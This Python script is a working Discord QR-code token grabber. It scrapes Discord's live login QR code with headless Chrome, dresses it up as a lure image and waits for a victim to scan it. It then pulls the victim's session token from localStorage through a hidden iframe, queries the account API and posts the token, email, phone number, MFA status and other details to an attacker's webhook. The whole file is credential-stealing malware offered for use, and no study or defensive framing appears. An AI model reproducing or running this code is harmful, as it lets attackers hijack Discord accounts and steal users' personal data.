from bs4 import BeautifulSoup as bs4
from selenium import webdriver
from PIL import Image
from discord_webhook import DiscordWebhook, DiscordEmbed
from selenium.webdriver.chrome.service import Service
import random ,base64,time,os,requests,colorama,datetime
from threading import Thread
import json
import lxml
import pathlib

def genqr():
    with open('config.json') as f:
        config = json.load(f)
    webhook = config.get('webhook')
    try:
        os.remove("temp/final_qr.png")
    except:
        pass
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_experimental_option('detach', True)
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument("disable-infobars")
    service=Service('chromedriver.exe')
    driver = webdriver.Chrome(service=service, options=options)
    driver.get('https://discord.com/login')
    time.sleep(3)

    page_source = driver.page_source
    qr_code = bs4(page_source, features='lxml').find('div', {'class': 'qrCode-2R7t9S'}).find('img')['src']
    file = os.path.join(os.getcwd(), 'temp\\qr_code.png')
    img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
    with open(file,'wb') as handler:
        handler.write(img_data)
    im1 = Image.open('temp/qr_code.png', 'r')
    im2 = Image.open('temp/overlay.png', 'r')
    im2_w, im2_h = im2.size
    im1.paste(im2, (60, 55))
    im1.save('temp/final_qr.png', quality=95)
    im1 = Image.open('temp/template.png', 'r')
    im2 = Image.open('temp/final_qr.png', 'r')
    im1.paste(im2, (30, 30))
    initial_count = 0
    fichier = os.path.join('static', 'image')
    for path in pathlib.Path(fichier).iterdir():
        if path.is_file():
            initial_count += 1
    im1.save(f"{fichier}/qr{initial_count}.png",quality=95)
    def verif():
        while True:
            if "https://discord.com/login" != driver.current_url:
                time.sleep(5)
                token = driver.execute_script('''
        window.dispatchEvent(new Event('beforeunload'));
        let iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        let localStorage = iframe.contentWindow.localStorage;
        var token = JSON.parse(localStorage.token);
        return token;
           
                            ''')
                w = DiscordWebhook(url=webhook)
                headers = {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }      
                res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                res = res.json()
                user_id = res['id']
                locale = res['locale']
                avatar_id = res['avatar']
                creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
                em = DiscordEmbed(color='03b2f8' ,Title="Token Grab Qr",description=f"""\nToken Grab Qr\nToken : {token}\nName: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})""")
                fields = [
                    {'name': 'Phone : ', 'value': res['phone']},
                    {'name': 'Flags : ', 'value': res['flags']},
                    {'name': 'Local language : ', 'value': res['locale']},
                    {'name': 'MFA : ', 'value': res['mfa_enabled']},
                    {'name': 'Verified : ', 'value': res['verified']},
                ]
                for field in fields:
                    if field['value']:
                        em.add_embed_field(name=field['name'], value=field['value'], inline=False)
                em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")  

                w.add_embed(em)
                w.execute()

                driver.quit()
                input()
                break
    thread = Thread(target=verif)
    thread.start()
    time.sleep(120)
    Thread.do_run = False
    thread.join()
    driver.quit()
